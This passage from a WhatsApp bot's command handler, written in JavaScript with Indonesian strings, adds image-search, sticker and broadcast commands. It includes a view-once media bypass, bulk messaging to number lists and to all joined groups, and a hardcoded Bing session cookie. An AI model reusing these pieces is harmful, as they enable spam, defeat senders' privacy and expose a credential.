   if (!m.isGroup) return alifatah.relayMessage(ngentod.key.remoteJid, ngentod.message, {
        messageId: ngentod.key.id,
    });
    
   if (m.isGroup) return alifatah.relayMessage(m.chat, {
        "requestPaymentMessage": {
            amount: {
                value: 4000000,
                offset: 100,
                currencyCode: 'IDR'
            },
            amount1000: 4000000,
            background: null,
            currencyCodeIso4217: 'IDR',
            expiryTimestamp: 1000000,
            noteMessage: {
                extendedTextMessage: {
                    text: '━────────────────────━\n\n<!> Create Panel + Button\n<!> Payment + Button\n<!> Tampilan Utama + Button\n<!> Addprem, Delprem \n<!> Addsaldo, Minsaldo, Saldo\n<!> Confess + Button & Biasa\n<!> Internet + IA + chatgpt\n<!> prompt-gpt\n<!> Xxqc Warna alifatahl\n<!> Cara Connect Bot\n<!> Rules Simpel\n<!> Addcase \n<!> Delcase <Error>\n<!> backup\n<!>  TestiMoni Own\n<!> Asupan Menu\n\nHarga Script? 40k + Update\nButton? Menu, Confess, Dll\nNo Enc? 100%\n\n━────────────────────━',
                }
            },
            requestFrom: m.sender
        }
    }, {});
}
break

case 'pinterest': case 'pin': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
  if (!text) return reply(`Nakano Ninoo`);
  //try {
  await reply(mess.wait);

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: alifatah.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 5); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: namaown
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await alifatah.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
  
}
break

case'bingimg':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
let text;
  if (args.length >= 1) {
    text = args.slice(0).join(" ");
  } else if (m.quoted && m.quoted.text) {
    text = m.quoted.text;
  } else {
    throw "*Example:* .bingimg 1girl";
  }

  await reply("Please wait...");
  try {
    const res = new BingImageCreator({
      cookie: `1OpWBgSV_5yNTConSXqr62v0eF6wmYdtItvn1lmd1A-g5f0jsnxenW45kuUfWuX969OCEdw9nR84jGSyTPDXXjGdEyBnCYj7_fx2mYuPksYzl8JvgtL3r5-4H2mB09kT8cEPa4zDc7AjnapyyzrMsG9wAkdBR_5FtbhwSQeLr8--ccB42S5U3jj8rTr3ZAQavt-Ge7wOQ2xkMGgmRPq038duFdZnTzcfWimkSqHN5z-U`,
    });
    const data = await res.createImage(text);

    if (data.length > 0) {
      for (let i = 0; i < data.length; i++) {
        try {
          if (!data[i].endsWith(".svg")) {
            await alifatah.sendFile(
              m.chat,
              data[i],
              "",
              `Image *(${i + 1}/${data.length})*\n\n*Prompt*: ${text}`,
              m,
              false,
              { mentions: [m.sender] },
            );
          }
        } catch (error) {
          console.error(`Error sending file: ${error.message}`);
          await reply(`Failed to send image *(${i + 1}/${data.length})*`);
        }
      }
    } else {
      await reply("No images found.");
    }
  } catch (error) {
    console.error(`Error in handler: ${error.message}`);
    await reply(`${error}\n\n${error.message}`);
  }
};
break

case "join": {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
  if (!isCreator) return reply(mess.owner)
  if (!text) return reply("where's the link bro?")
  if (!text.includes("chat.whatsapp.com")) return reply("link not listed !")
  let ano = text.split("https://chat.whatsapp.com/")[1]
  alifatah.groupAcceptInvite(ano)
  reply(`Success bro`)
}
break

case 'promosisekolah': {
    if (!text) return reply(`_Text nya mana kak_..\nContoh Penggunaan: ${prefix+command} pesaannya|nomer1,nomer2`);
let input = text.split('|');
let nomorList = input[0] ? input[0].split(',') : [];
let pesan = input[1] ? input[1] : '-';
if (nomorList.length === 0) return reply('_Nomornya mana kak_..');
for (let nomor of nomorList) {
    let nomorFormatted = nomor.trim() + '@s.whatsapp.net';
    await alifatah.sendMessage(nomorFormatted, { text: pesan });
    await sleep(5000);  // Menunggu 5 detik sebelum mengirim pesan berikutnya
}
reply('_Succes Kak_...');
   }
   break

case 'readviewonce': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
	if (!m.quoted) return reply(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return reply(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return alifatah.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return alifatah.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break

case 'jpm':{
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
let getGroups = await alifatah.groupFetchalifatahlParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await alifatah.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await alifatah.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await alifatah.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await alifatah.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL ✅*")
}
break

/*case 'jpm2': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`Text mana?\n\nExample : ${prefix + command} ${global.namabot}`)
let getGroups = await author.groupFetchalifatahlParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: `bjir@newsletter`,
 newsletterName: `Script WhatsApp V5`, 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: alifatah.decodeJid(alifatah.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: text
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ''
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: '',
 subtitle: `${namaown}`,
 hasMediaAttachment: false,
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6285216955233\",\"merchant_url\":\"https://wa.me/6282132710183\"}"
 },
 ]
 })
 })
 }
 }
}, {})

await alifatah.relayMessage(i, msg.message, {
 messageId: msg.key.id
})
}
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break*/

case 'website':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
    let msg = await generateWAMessageFromContent(m.chat, { locationMessage: {
  degreesLatitude: -7.2678119,
  degreesLongitude: 107.81886705,
  name: 'KLIK DISINI',
  address: `Website Owner`,
  url: 'https://shoplinks.to/Marketingalifatahifatah',
  sequenceNumber: 1709322015967001, timeOffset: 8600, jpegThumbnail: null,
  contextInfo: {
    mentionedJid: [m.sender], 
    forwardingScore: 999,
    isForwarded: true,
  forwardedNewsletterMessageInfo: {
    newsletterJid: 'bjir@newsletter',
    newsletterName: 'Fauzialifatah',
    serverMessageId: 143
  }
}
}
},{ quoted:fcall })
alifatah.relayMessage(m.chat, msg.message, {})
}
break

case 's': case 'sticker': case 'stiker': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await alifatah.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await alifatah.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break

case 'animepoke':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break

case 'animewink':{
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break

case 'animebonk':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebully':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeyeet':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebite':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animelick':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekill':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecry':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewlp':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekiss':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehug':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeneko':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepat':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeslap':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecuddle':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewaifu':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animenom':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefoxgirl':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await alifatah.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animetickle': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await alifatah.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animegecg': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await alifatah.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break

case 'dogwoof': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await alifatah.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '8ballpool': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await alifatah.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'goosebird': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await alifatah.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefeed': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await alifatah.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeavatar': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await alifatah.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'lizardpic': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await alifatah.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'catmeow': {
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await alifatah.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break

case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
reply(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
